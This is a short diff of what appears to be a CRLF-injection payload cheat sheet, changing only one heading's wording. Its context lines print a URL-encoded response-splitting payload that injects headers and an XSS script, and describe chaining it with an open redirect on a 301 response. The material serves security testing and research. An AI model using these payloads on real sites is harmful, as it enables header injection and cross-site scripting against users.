@@ -54,7 +54,7 @@ _Note:_ This sometimes works. (Discovered in some Yandex sites, was not exploita
 %0d%0aContent-Type:%20text%2fhtml%0d%0aHTTP%2f1.1%20200%20OK%0d%0aContent-Type:%20text%2fhtml%0d%0a%0d%0a%3Cscript%3Ealert('XSS');%3C%2fscript%3E
 ```
 
-**Response splitting on 301 code, chained with Open Redirect to corrupt location header to break 301** by [@black2fan](https://twitter.com/black2fan) (Facebook bug)
+**Response splitting on 301 code, chained with Open Redirect to corrupt location header and to break 301** by [@black2fan](https://twitter.com/black2fan) (Facebook bug)
 
 _Note:_ `xxx:1` was used for breaking open redirect destination (Location header). Great example how of to escalate CRLF to XSS on a such, it would seem, unexploitable 301 status code.
 
